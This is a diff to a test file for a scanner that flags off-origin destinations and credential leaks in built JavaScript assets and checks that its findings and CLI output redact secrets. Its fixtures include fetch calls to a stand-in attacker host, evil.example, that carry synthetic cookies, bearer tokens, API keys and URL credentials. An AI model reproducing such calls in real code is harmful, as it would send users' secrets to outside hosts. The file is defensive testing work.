@@ -1,4 +1,10 @@
 import { describe, expect, it } from 'vitest';
+// @ts-expect-error The repo intentionally carries no global Node typings; this
+// test exercises the executable guard's stdout/stderr boundary.
+import { spawnSync } from 'node:child_process';
+import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
 
 import packageJson from '../package.json';
 
@@ -26,9 +32,28 @@ interface Violation {
   value: string;
 }
 
+declare const process: {
+  cwd(): string;
+  execPath: string;
+};
+
 const rules = (hits: Violation[]): string[] => hits.map((hit) => hit.rule);
 const scan = (text: string, only?: Set<string>): Violation[] =>
   emittedViolationsIn(text, 'assets/index-a1b2c3.js', only ?? null) as Violation[];
+const GUARD = join(process.cwd(), 'scripts/check-no-direct-exposure.mjs');
+
+function capturedCliOutput(text: string): string {
+  const root = mkdtempSync(join(tmpdir(), 'gw-emitted-redaction-'));
+  try {
+    mkdirSync(join(root, 'assets'));
+    writeFileSync(join(root, 'assets/index.js'), text);
+    const result = spawnSync(process.execPath, [GUARD, '--emitted', root], { encoding: 'utf8' });
+    expect(result.status).toBe(1);
+    return `${result.stdout}${result.stderr}`;
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+}
 
 describe('emitted artifact is scanned for off-origin destinations (#55 AC2)', () => {
   it('covers every emitted text form the acceptance criterion names', () => {
@@ -50,10 +75,10 @@ describe('emitted artifact is scanned for off-origin destinations (#55 AC2)', ()
     expect(hits.every((hit) => !hit.value.includes('hunter2'))).toBe(true);
   });
 
-  it('reports the rule, the excerpt, and the reason on every finding', () => {
+  it('reports the rule, a safe destination, and the reason on every finding', () => {
     const [hit] = scan('fetch("https://evil.example/collect")');
     expect(hit.rule).toContain('off-origin');
-    expect(hit.value).toContain('evil.example');
+    expect(hit.value).toBe('destination=https://evil.example');
     expect(hit.why).not.toHaveLength(0);
   });
 
@@ -148,6 +173,22 @@ describe('credentials never attach off-origin (#55 AC3)', () => {
     const hits = scan('fetch("https://u:hunter2@evil.example/v1",{credentials:"include"})');
     expect(hits).not.toHaveLength(0);
     expect(hits.every((hit) => !hit.value.includes('hunter2')), JSON.stringify(hits)).toBe(true);
+  });
+
+  it('keeps synthetic credential sentinels out of helper findings and CLI output', () => {
+    const cases = [
+      'const Cookie="SYNTH_COOKIE_7e91";fetch("https://evil.example/v1",{headers:{Cookie}})',
+      'const Authorization="Bearer SYNTH_AUTH_7e91";fetch("https://evil.example/v1")',
+      'const key="SYNTH_API_KEY_7e91";fetch("https://evil.example/v1",{headers:{"X-Api-Key":key}})',
+      'fetch("https://user:SYNTH_USERINFO_7e91@evil.example/v1")',
+      'fetch("https:%2f%2fuser:SYNTH_DECODED_7e91@evil.example/v1")',
+    ];
+    for (const source of cases) {
+      const marker = source.match(/SYNTH_[A-Z_0-9]+/)?.[0];
+      expect(marker).toBeTruthy();
+      expect(JSON.stringify(scan(source))).not.toContain(marker!);
+      expect(capturedCliOutput(source)).not.toContain(marker!);
+    }
   });
 
   it('leaves the correct same-origin credentialed call alone', () => {
